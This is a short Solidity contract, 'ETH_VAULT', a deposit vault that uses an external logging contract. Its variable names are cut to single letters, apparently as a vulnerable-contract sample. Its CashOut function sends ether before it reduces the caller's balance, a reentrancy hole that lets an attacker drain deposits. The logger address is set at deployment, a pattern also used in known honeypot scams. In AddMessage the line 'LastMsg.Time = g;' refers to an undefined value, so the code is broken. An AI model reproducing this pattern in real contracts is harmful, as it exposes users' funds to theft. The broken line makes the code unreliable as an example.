// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract ETH_VAULT
{
    mapping (address => uint) public a;

    uint public MinDeposit = 1 ether;

    Log TransferLog;

    function ETH_VAULT(address d)
    public
    {
        TransferLog = Log(d);
    }

    function Deposit()
    public
    payable
    {
        if(msg.value > MinDeposit)
        {
            a[msg.sender]+=msg.value;
            TransferLog.AddMessage(msg.sender,msg.value,"Deposit");
        }
    }

    function CashOut(uint f)
    public
    payable
    {
        if(f<=a[msg.sender])
        {
            if(msg.sender.call.value(f)())
            {
                a[msg.sender]-=f;
                TransferLog.AddMessage(msg.sender,f,"CashOut");
            }
        }
    }

    function() public payable{}

}

contract Log
{

    struct Message
    {
        address Sender;
        string  Data;
        uint Val;
        uint  Time;
    }

    Message[] public History;

    Message LastMsg;

    function AddMessage(address e,uint c,string b)
    public
    {
        LastMsg.Sender = e;
        LastMsg.Time = g;
        LastMsg.Val = c;
        LastMsg.Data = b;
        History.push(LastMsg);
    }
}